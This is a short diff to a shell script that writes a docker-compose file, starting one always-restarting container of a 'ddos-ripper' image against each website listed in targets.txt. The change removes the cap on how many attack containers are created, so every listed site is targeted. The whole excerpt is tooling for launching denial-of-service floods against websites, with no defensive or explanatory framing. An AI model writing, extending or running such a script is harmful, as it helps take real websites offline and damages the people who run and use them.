@@ -48,14 +48,12 @@ generate_compose () {
   echo "services:" >> docker-compose.yml
   counter=1
   while read -r site_url; do
-    if [ $counter -le $amount ]; then
-      if [ ! -z $site_url ]; then
+    if [ ! -z $site_url ]; then
         echo "  ddos-runner-$counter:" >> docker-compose.yml
         echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
         echo "    restart: always" >> docker-compose.yml
         echo "    command: $site_url" >> docker-compose.yml
         ((counter=counter+1))
-      fi
     fi
   done < targets.txt
 }
